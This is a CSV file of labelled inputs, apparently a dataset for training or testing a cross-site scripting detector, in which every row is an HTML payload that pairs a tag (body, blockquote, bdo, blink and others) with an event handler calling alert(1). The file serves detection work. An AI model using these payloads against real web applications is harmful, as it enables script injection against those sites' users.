input,label
"<base onmouseenter=""alert(1)"">test</base>",1
"<base onmouseleave=""alert(1)"">test</base>",1
"<base onmousemove=""alert(1)"">test</base>",1
"<base onmouseout=""alert(1)"">test</base>",1
"<base onmouseover=""alert(1)"">test</base>",1
"<base onmouseup=""alert(1)"">test</base>",1
"<base onpaste=""alert(1)"" contenteditable>test</base>",1
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",1
"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>",1
"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>",1
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",1
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",1
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,1
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,1
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,1
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,1
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,1
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,1
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",1
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",1
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",1
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,1
"<basefont onclick=""alert(1)"">test</basefont>",1
"<basefont oncontextmenu=""alert(1)"">test</basefont>",1
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",1
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",1
"<basefont ondblclick=""alert(1)"">test</basefont>",1
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,1
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",1
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",1
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",1
"<basefont onmousedown=""alert(1)"">test</basefont>",1
"<basefont onmouseenter=""alert(1)"">test</basefont>",1
"<basefont onmouseleave=""alert(1)"">test</basefont>",1
"<basefont onmousemove=""alert(1)"">test</basefont>",1
"<basefont onmouseout=""alert(1)"">test</basefont>",1
"<basefont onmouseover=""alert(1)"">test</basefont>",1
"<basefont onmouseup=""alert(1)"">test</basefont>",1
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",1
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",1
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",1
"<bdi draggable=""true"" ondragleave=""alert(1)"">test</bdi>",1
"<bdi draggable=""true"" ondragstart=""alert(1)"">test</bdi>",1
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,1
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,1
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>,1
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,1
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,1
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,1
"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>",1
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",1
"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>",1
<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>,1
"<bdi onclick=""alert(1)"">test</bdi>",1
"<bdi oncontextmenu=""alert(1)"">test</bdi>",1
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",1
"<bdi ondblclick=""alert(1)"">test</bdi>",1
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>,1
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",1
"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>",1
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",1
"<bdi onmousedown=""alert(1)"">test</bdi>",1
"<bdi onmouseenter=""alert(1)"">test</bdi>",1
"<bdi onmouseleave=""alert(1)"">test</bdi>",1
"<bdi onmousemove=""alert(1)"">test</bdi>",1
"<bdi onmouseout=""alert(1)"">test</bdi>",1
"<bdi onmouseover=""alert(1)"">test</bdi>",1
"<bdi onmouseup=""alert(1)"">test</bdi>",1
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",1
"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>",1
"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>",1
"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",1
"<bdo draggable=""true"" ondragleave=""alert(1)"">test</bdo>",1
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,1
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,1
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,1
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,1
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,1
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,1
"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",1
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",1
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",1
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,1
"<bdo onclick=""alert(1)"">test</bdo>",1
"<bdo oncontextmenu=""alert(1)"">test</bdo>",1
"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",1
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",1
"<bdo ondblclick=""alert(1)"">test</bdo>",1
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,1
"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>",1
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",1
"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>",1
"<bdo onmousedown=""alert(1)"">test</bdo>",1
"<bdo onmouseenter=""alert(1)"">test</bdo>",1
"<bdo onmouseleave=""alert(1)"">test</bdo>",1
"<bdo onmousemove=""alert(1)"">test</bdo>",1
"<bdo onmouseout=""alert(1)"">test</bdo>",1
"<bdo onmouseover=""alert(1)"">test</bdo>",1
"<bdo onmouseup=""alert(1)"">test</bdo>",1
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
"<bgsound draggable=""true"" ondrag=""alert(1)"">test</bgsound>",1
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",1
"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",1
"<bgsound draggable=""true"" ondragleave=""alert(1)"">test</bgsound>",1
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",1
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,1
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,1
<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>,1
<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>,1
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,1
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,1
"<bgsound onbeforecopy=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",1
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,1
"<bgsound onclick=""alert(1)"">test</bgsound>",1
"<bgsound oncontextmenu=""alert(1)"">test</bgsound>",1
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound ondblclick=""alert(1)"">test</bgsound>",1
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,1
"<bgsound onkeydown=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>",1
"<bgsound onmousedown=""alert(1)"">test</bgsound>",1
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",1
"<bgsound onmouseleave=""alert(1)"">test</bgsound>",1
"<bgsound onmousemove=""alert(1)"">test</bgsound>",1
"<bgsound onmouseout=""alert(1)"">test</bgsound>",1
"<bgsound onmouseover=""alert(1)"">test</bgsound>",1
"<bgsound onmouseup=""alert(1)"">test</bgsound>",1
"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",1
"<big draggable=""true"" ondrag=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragenter=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",1
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1
<big id=x tabindex=1 onactivate=alert(1)></big>,1
<big id=x tabindex=1 onbeforeactivate=alert(1)></big>,1
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,1
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,1
<big id=x tabindex=1 onfocus=alert(1)></big>,1
<big id=x tabindex=1 onfocusin=alert(1)></big>,1
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",1
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",1
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",1
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<big onclick=""alert(1)"">test</big>",1
"<big oncontextmenu=""alert(1)"">test</big>",1
"<big oncopy=""alert(1)"" contenteditable>test</big>",1
"<big oncut=""alert(1)"" contenteditable>test</big>",1
"<big ondblclick=""alert(1)"">test</big>",1
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<big onkeydown=""alert(1)"" contenteditable>test</big>",1
"<big onkeypress=""alert(1)"" contenteditable>test</big>",1
"<big onkeyup=""alert(1)"" contenteditable>test</big>",1
"<big onmousedown=""alert(1)"">test</big>",1
"<big onmouseenter=""alert(1)"">test</big>",1
"<big onmouseleave=""alert(1)"">test</big>",1
"<big onmousemove=""alert(1)"">test</big>",1
"<big onmouseout=""alert(1)"">test</big>",1
"<big onmouseover=""alert(1)"">test</big>",1
"<big onmouseup=""alert(1)"">test</big>",1
"<big onpaste=""alert(1)"" contenteditable>test</big>",1
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",1
"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",1
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",1
"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>",1
<blink id=x tabindex=1 onactivate=alert(1)></blink>,1
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,1
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,1
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,1
<blink id=x tabindex=1 onfocus=alert(1)></blink>,1
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,1
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",1
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",1
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>,1
"<blink onclick=""alert(1)"">test</blink>",1
"<blink oncontextmenu=""alert(1)"">test</blink>",1
"<blink oncopy=""alert(1)"" contenteditable>test</blink>",1
"<blink oncut=""alert(1)"" contenteditable>test</blink>",1
"<blink ondblclick=""alert(1)"">test</blink>",1
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,1
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",1
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",1
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",1
"<blink onmousedown=""alert(1)"">test</blink>",1
"<blink onmouseenter=""alert(1)"">test</blink>",1
"<blink onmouseleave=""alert(1)"">test</blink>",1
"<blink onmousemove=""alert(1)"">test</blink>",1
"<blink onmouseout=""alert(1)"">test</blink>",1
"<blink onmouseover=""alert(1)"">test</blink>",1
"<blink onmouseup=""alert(1)"">test</blink>",1
"<blink onpaste=""alert(1)"" contenteditable>test</blink>",1
"<blockquote draggable=""true"" ondrag=""alert(1)"">test</blockquote>",1
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",1
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",1
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",1
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",1
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,1
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,1
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>,1
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>,1
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,1
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,1
"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",1
<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>,1
"<blockquote onclick=""alert(1)"">test</blockquote>",1
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",1
"<blockquote oncopy=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote ondblclick=""alert(1)"">test</blockquote>",1
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,1
"<blockquote onkeydown=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote onkeypress=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote onkeyup=""alert(1)"" contenteditable>test</blockquote>",1
"<blockquote onmousedown=""alert(1)"">test</blockquote>",1
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",1
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",1
"<blockquote onmousemove=""alert(1)"">test</blockquote>",1
"<blockquote onmouseout=""alert(1)"">test</blockquote>",1
"<blockquote onmouseover=""alert(1)"">test</blockquote>",1
"<blockquote onmouseup=""alert(1)"">test</blockquote>",1
"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",1
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",1
"<body draggable=""true"" ondragend=""alert(1)"">test</body>",1
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",1
"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",1
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",1
<body id=x tabindex=1 onactivate=alert(1)></body>,1
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,1
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,1
<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,1
<body id=x tabindex=1 onfocus=alert(1)></body>,1
<body id=x tabindex=1 onfocusin=alert(1)></body>,1
<body onafterprint=alert(1)>,1
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",1
"<body onbeforecut=""alert(1)"" contenteditable>test</body>",1
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1
<body onbeforeprint=alert(1)>,1
"<body onbeforeunload=""location='javascript:alert(1)'"">",1
<body onblur=alert(1) id=x><iframe id=x>,1
"<body onclick=""alert(1)"">test</body>",1
"<body oncontextmenu=""alert(1)"">test</body>",1
"<body oncopy=""alert(1)"" contenteditable>test</body>",1
"<body oncut=""alert(1)"" contenteditable>test</body>",1
"<body ondblclick=""alert(1)"">test</body>",1
<body onerror=alert(1) onload=/>,1
<body onfocusout=alert(1) id=x><iframe id=x>,1
"<body onhashchange=""alert(1)"">",1
"<body onkeydown=""alert(1)"" contenteditable>test</body>",1
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1
"<body onkeyup=""alert(1)"" contenteditable>test</body>",1
<body onload=alert(1)>,1
<body onmessage=alert(1)>,1
"<body onmousedown=""alert(1)"">test</body>",1
"<body onmouseenter=""alert(1)"">test</body>",1
"<body onmouseleave=""alert(1)"">test</body>",1
"<body onmousemove=""alert(1)"">test</body>",1
"<body onmouseout=""alert(1)"">test</body>",1
"<body onmouseover=""alert(1)"">test</body>",1
"<body onmouseup=""alert(1)"">test</body>",1
<body onpageshow=alert(1)>,1
"<body onpaste=""alert(1)"" contenteditable>test</body>",1
<body onpopstate=alert(1)>,1
"<body onresize=""alert(1)"">",1
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,1
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,1
<body onwheel=alert(1)>,1
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",1
"<br draggable=""true"" ondragend=""alert(1)"">test</br>",1
"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",1
"<br draggable=""true"" ondragleave=""alert(1)"">test</br>",1
"<br draggable=""true"" ondragstart=""alert(1)"">test</br>",1
<br id=x tabindex=1 onactivate=alert(1)></br>,1
<br id=x tabindex=1 onbeforeactivate=alert(1)></br>,1
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,1
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>,1
<br id=x tabindex=1 onfocus=alert(1)></br>,1
<br id=x tabindex=1 onfocusin=alert(1)></br>,1
"<br onbeforecopy=""alert(1)"" contenteditable>test</br>",1
"<br onbeforecut=""alert(1)"" contenteditable>test</br>",1
"<br onbeforepaste=""alert(1)"" contenteditable>test</br>",1
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,1
"<br onclick=""alert(1)"">test</br>",1
"<br oncontextmenu=""alert(1)"">test</br>",1
"<br oncopy=""alert(1)"" contenteditable>test</br>",1
"<br oncut=""alert(1)"" contenteditable>test</br>",1
"<br ondblclick=""alert(1)"">test</br>",1
<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>,1
"<br onkeydown=""alert(1)"" contenteditable>test</br>",1
"<br onkeypress=""alert(1)"" contenteditable>test</br>",1
"<br onkeyup=""alert(1)"" contenteditable>test</br>",1
"<br onmousedown=""alert(1)"">test</br>",1
